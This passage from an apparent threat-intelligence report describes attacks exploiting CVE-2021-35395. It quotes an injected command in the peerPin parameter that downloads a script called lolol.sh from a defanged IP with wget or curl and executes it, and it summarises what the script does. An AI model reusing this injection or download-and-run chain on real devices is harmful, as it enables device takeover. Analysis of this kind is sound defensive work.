@@ -1,0 +1,5 @@
+
+We observed another set of attacks, first noted by SAM Seamless Network , that also used the same proof-of-concept exploit from the initial disclosure but with a different payload: Figure 3.
+Another example of a POST request exploiting CVE-2021-35395.
+The injected commands in the peerPin parameter attempt to download a malicious script called lolol.sh using either wget or curl and then execute it:
+cd /tmp;\r\nwget hxxp://212[.]192.241.87/lolol.sh;\r\ncurl -O hxxp://212[.]192.241.87/lolol.sh;\r\nchmod 777 lolol.sh;\r\nsh lolol.sh; The lolol.sh script starts by deleting logs and killing a large number of named processes and services, then specifically finding and killing processes using a significant amount of CPU time: Figure 4.
